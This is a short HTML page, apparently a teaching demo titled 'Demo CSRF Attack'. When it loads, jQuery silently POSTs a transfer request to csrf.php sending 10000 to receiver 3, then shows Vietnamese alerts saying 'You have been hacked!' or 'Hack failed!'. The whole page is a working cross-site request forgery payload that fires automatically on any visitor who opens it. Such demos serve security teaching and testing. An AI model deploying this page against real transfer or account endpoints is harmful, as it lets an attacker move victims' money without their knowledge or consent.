<h2>Demo CSRF Attack</h2>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>
    $(document).ready(function() {
        $.ajax({
            url: "csrf.php",
            method: "POST",
            data: {
                submit: 1,
                receiver: 3,
                amount: 10000
            },
            success: function(res) {
                alert("Bạn đã bị hack!");
            },
            error: function(xhr, status, error) {
                alert("Hack thất bại!");
            }
        });
    });
</script>